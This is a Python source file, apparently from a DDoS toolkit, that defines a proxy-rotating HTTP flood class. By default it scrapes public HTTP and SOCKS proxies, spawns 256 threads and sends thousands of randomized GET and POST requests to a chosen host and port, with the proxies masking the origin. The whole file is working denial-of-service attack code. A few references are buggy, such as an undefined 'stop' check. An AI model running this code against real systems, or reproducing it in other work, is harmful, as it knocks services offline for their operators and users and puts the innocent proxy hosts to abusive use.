from bane.ddos.utils import *

class prox_http_spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        scraping_timeout=15,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        paths=["/"],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
    ):
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol='socks4',timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol='socks5',timeout=scraping_timeout)
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) > 0:
                        bot_type.append("h")
                    if len(self.socks4list) > 0:
                        bot_type.append("s4")
                    if len(self.socks5list) > 0:
                        bot_type.append("s5")
                    z = random.choice(bot_type)
                    if z == "h":
                        line = random.choice(self.httplist)
                    elif z == "s4":
                        line = random.choice(self.socks4list)
                    elif z == "s5":
                        line = random.choice(self.socks5list)
                    ipp = line.split(":")[0].split("=")[0]
                    pp = line.split(":")[1].split("=")[0]
                    s = socks.socksocket()
                    if z == "h":
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == "s4":
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == "s5":
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == "h":
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = "GET"
                        else:
                            req = "POST"
                        m = setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            self.user_agents,
                        )
                        try:
                            if stop == True:
                                break
                            s.send(m.encode("utf-8"))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(
                                        ipp, self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
                            time.sleep(self.interval)
                        except:
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass
